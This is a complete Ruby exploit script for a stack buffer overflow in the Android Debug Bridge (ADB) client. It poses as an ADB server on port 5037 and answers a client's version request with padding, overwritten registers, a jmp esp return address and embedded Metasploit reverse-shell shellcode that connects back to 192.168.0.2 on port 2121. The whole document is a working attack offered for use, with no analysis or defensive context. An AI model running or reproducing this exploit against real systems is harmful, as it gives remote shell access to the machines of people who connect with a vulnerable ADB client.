#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'socket'
require 'uri'

puts "[*] Exploit for ADB client stack buffer overflow -jduck"

# linux/x86/shell_reverse_tcp - 90 bytes
# http://www.metasploit.com
# VERBOSE=false, LHOST=192.168.0.2, LPORT=2121,
# ReverseConnectRetries=5, ReverseAllowProxy=false,
# PrependFork=true, PrependSetresuid=false,
# PrependSetreuid=false, PrependSetuid=false,
# PrependSetresgid=false, PrependSetregid=false,
# PrependSetgid=false, PrependChrootBreak=false,
# AppendExit=true, InitialAutoRunScript=, AutoRunScript=
payload =
  "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x06\x31\xc0\xb0\x01\xcd" +
  "\x80\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66" +
  "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8" +
  "\x00\x02\x68\x02\x00\x08\x49\x89\xe1\xb0\x66\x50\x51\x53" +
  "\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f" +
  "\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x31" +
  "\xdb\x6a\x01\x58\xcd\x80"

def read_request(cli)
  len = cli.recv(4)
  len = len.to_i(16)
  puts "[*] request length: #{len}"

  buf = cli.recv(len)
  puts "[*] request: #{buf.inspect}"
  buf
end

srv = TCPServer.new 5037
loop {
  puts "[*] Waiting for client..."
  cli = srv.accept
  puts "[*] Accepted client"
    
  req = read_request(cli)
  if req != "host:version"
    puts "[-] incorrect request!"
    next
  end

  res = "OKAY"
  res << "-fff"
  res << ("A" * 112) # padding

  # popped registers
  res << [
    0xc0c00004, # ebx
    0xc0c00008, # esi
    0xc0c0000c, # edi
    0xc0c00010, # ebp
    #0x0810efd3, # eip - int 3 / ret
    0x812a14b, # eip - jmp esp
  ].pack('V*')

  res << payload

  puts "[*] Sending response (0x%x bytes)" % res.length
  cli.write(res)
  cli.close
}
srv.close

